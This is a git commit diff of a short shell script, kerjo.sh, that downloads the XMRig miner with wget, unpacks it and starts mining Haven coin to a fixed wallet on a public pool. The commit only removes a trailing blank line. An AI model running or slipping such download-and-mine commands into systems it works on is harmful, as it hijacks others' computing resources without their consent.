61fb7c858e0de7254c55f22f8454a36b7b120921
zottaloyew <85932742+zottaloyew@users.noreply.github.com>
2021-06-19 14:49:51 +0200

    Update kerjo.sh

--- kerjo.sh
+++ kerjo.sh
@@ -4,4 +4,3 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux
 tar xf xmrig-6.12.2-linux-x64.tar.gz
 cd xmrig-6.12.2
 ./xmrig --donate-level 1 -o haven.herominers.com:10450 -u hvs1JUEon79AQJs1w4XfYZ1mNYBVxunQhKzDGSteHM7QVq6zxEp4KRKVhGJBdzxsioATdRrxDjh2DLbmgxdz7XP22nXEz2Lum1 -p nyar -a cn-heavy/xhv -k
-
